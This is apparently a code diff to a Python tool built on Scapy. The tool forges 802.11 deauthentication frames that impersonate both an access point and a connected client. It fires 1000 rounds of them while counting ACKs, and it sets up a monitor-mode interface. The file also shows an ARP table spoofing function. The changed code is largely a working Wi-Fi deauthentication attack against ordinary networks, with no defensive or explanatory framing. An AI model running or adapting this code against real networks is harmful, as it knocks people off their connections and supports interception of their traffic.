@@ -60,6 +60,8 @@ def set_two_ifaces_to_use(iface_man: NetworkInterface, iface_mon: NetworkInterfa
     global iface_managed, iface_monitor
     iface_managed = iface_man
     iface_monitor = iface_mon
+    set_mode('managed', iface_managed)
+    set_mode('monitor', iface_monitor)
 
 
 def get_connected_wifi_bssid(iface=None):
@@ -108,18 +110,24 @@ def disconnect_client(network: Network=None, client_MAC: str = '', broadcast: bo
         iface = iface_monitor
     if network is None:
         network = connected_network
-    def from_hexstream_to_packet(hexstream):
-        packet = RadioTap(bytes.fromhex(hexstream))
-        return packet
-    def send_deauth_packet(packet, iface, count, inter):
-        def produce_sc(frag: int, seq: int) -> int:
-            return (seq << 4) + frag
-        print(packet.summary())
-        with redirect_stdout(io.StringIO()):
-            for seq_num in range(count):
-                packet[Dot11].SC = produce_sc(0, seq_num)
-                sendp(packet, iface=iface, monitor=True, count=1)
-                packet.addr1, packet.addr2 = packet.addr2, packet.addr1  # Swap src, dst
+
+
+    ack_to_client = 0
+    ack_to_AP = 0
+
+    def handle_deauth_ack(packet):
+        nonlocal ack_to_client, ack_to_AP
+        if packet.haslayer(Dot11):
+            if packet.type == 1 and packet.subtype == 13:
+                if packet.addr1 == client_MAC:
+                    ack_to_client += 1
+                elif packet.addr1 == network.bssid:
+                    ack_to_AP += 1
+                print('Sending 64 directed DeAuth. STMAC: [{}] [C{}|A{} ACKs]'.format(client_MAC, ack_to_client,
+                                                                                        ack_to_AP), end='\r')
+
+    def produce_sc(seq: int, frag: int=0) -> int:
+        return (seq << 4) + frag
 
     if iface is None:
         iface = iface_monitor
@@ -132,17 +140,26 @@ def disconnect_client(network: Network=None, client_MAC: str = '', broadcast: bo
     deauth_packet_type2 = (RadioTap(present="TXFlags+b18", notdecoded=b'\x00')
                      / Dot11(ID=14849, addr1=client_MAC, addr2=network.bssid, addr3=network.bssid)
                      / Dot11Deauth(reason=7))
-    '''
+    
     deauth_packet_type1 = from_hexstream_to_packet('00000c000480000002001800c0003a0104292e794a12588694a0b468588694a0b46800000700')
     deauth_packet_type2 = from_hexstream_to_packet('00000b0000800200000000c0003a0104292e794a12588694a0b468588694a0b46800000700')
+    '''
+    deauth_packet = []
+    deauth_packet.append(RadioTap(present='Rate+TXFlags', Rate=1, TXFlags=0x0018)
+                         / Dot11(ID=produce_sc(314), addr1=client_MAC, addr2=network.bssid, addr3=network.bssid)
+                         / Dot11Deauth(reason=7))   # From AP to Client
+
+    deauth_packet.append(RadioTap(present='TXFlags+b18', notdecoded=b'\x00')
+                         / Dot11(ID=produce_sc(314), addr1=network.bssid, addr2=client_MAC, addr3=network.bssid)
+                         / Dot11Deauth(reason=7))   # From Client to AP
     set_channel(network.channel, iface)
-    thread1 = threading.Thread(target=send_deauth_packet, args=(deauth_packet_type1, iface, 100, 0.1))
-    thread2 = threading.Thread(target=send_deauth_packet, args=(deauth_packet_type2, iface, 100, 0.1))
     print('[monitor] Sending 100 802.11 Deauthentication Frame to AP and client host... ')
-    thread1.start()
-    thread2.start()
-    thread1.join()
-    thread2.join()
+    for i in range(1000):
+        deauth_packet[0][Dot11].SC = produce_sc(i)
+        deauth_packet[1][Dot11].SC = produce_sc(i)
+        sendp(deauth_packet, iface=iface, monitor=True, verbose=False)
+        sniff(iface=iface, monitor=True, timeout=0.001, prn=handle_deauth_ack, store=0)
+    print(f'\n')
     print('[monitor] Done. ')
 
 def spoof_ARP_table(gateway_IP: str, target_IP: str, iface: None):
@@ -334,19 +351,23 @@ def _find_MAC_from_IP(host_list: list[Host], network: Network, iface=None):
     return host_list
 
 
-def linux_init_iface_mon(iface=None):
+def linux_create_iface_mon(iface=None):
+    if iface is None:
+        iface = iface_managed
+    set_mode('monitor', iface_managed)  # To prevent channel=-1 phenomenon in monitor mode interface
     iface_mon_name = ('mon'+iface.name)[:15]
     result = subprocess.run(['iw', iface.name, 'interface', 'add', iface_mon_name, 'type', 'monitor'],
                          capture_output=True, text=True)
     result.check_returncode()
     result = subprocess.run(['ip', 'link', 'set', iface_mon_name, 'up'], capture_output=True, text=True)
     result.check_returncode()
+    set_mode('managed', iface_managed)  # To prevent channel=-1 phenomenon in monitor mode interface
     return iface_mon_name
 
 
 if __name__ == '__main__':
     if LINUX:
-        linux_init_iface_mon()
+        linux_create_iface_mon()
 
     iface_list = lookup_iface()
     # Uses two interfaces: one connects to the target WiFi(Managed mode), the other monitors 802.11 frames(Monitor mode)
